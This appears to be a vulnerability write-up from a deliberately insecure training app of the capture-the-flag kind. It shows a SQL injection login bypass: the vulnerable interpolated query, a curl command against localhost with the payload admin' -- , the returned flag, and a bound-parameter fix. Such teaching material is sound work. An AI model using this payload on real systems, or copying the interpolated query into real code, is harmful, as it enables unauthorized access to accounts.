# A03:2021 - Injection (SQL Injection)

**Endpoint:** `POST /a03-sqli/login`
**Severity:** Critical

## Vulnerability

This legacy login endpoint builds SQL by directly interpolating user input
into the query string instead of using bound parameters:

```python
# app/challenges/a03_sqli.py
query = text(
    f"SELECT id, username, is_admin FROM user "
    f"WHERE username = '{username}' AND password_hash = '{password}'"
)
row = db.session.execute(query).first()
```

Since `password_hash` stores a bcrypt-style hash, a legitimate password
never matches it directly here — but that's irrelevant once `username` can
break out of its quotes and comment out the rest of the query.

## Reproduce

```bash
curl -s -X POST http://localhost:5000/a03-sqli/login \
  -H 'Content-Type: application/json' \
  -d "{\"username\": \"admin' -- \", \"password\": \"anything\"}"
```

The resulting query becomes:

```sql
SELECT id, username, is_admin FROM user WHERE username = 'admin' -- ' AND password_hash = 'anything'
```

`--` comments out the password check entirely, so the query returns the
admin row regardless of what password was supplied:

```json
{"id": 2, "username": "admin", "is_admin": true, "flag": "FLAG{sql_injection_login_bypass}"}
```

## Impact

Complete authentication bypass — no valid credentials required to log in
as any user, including admin.

## Fix

Use bound parameters, always:

```python
query = text("SELECT id, username, is_admin FROM user WHERE username = :u")
row = db.session.execute(query, {"u": username}).first()
```

Better yet, use the ORM (`User.query.filter_by(username=username).first()`)
and verify the password with `check_password_hash`, as the `/a01/login`
endpoint in this same app already does correctly.

## Reference

[OWASP Top 10 2021 - A03 Injection](https://owasp.org/Top10/A03_2021-Injection/)
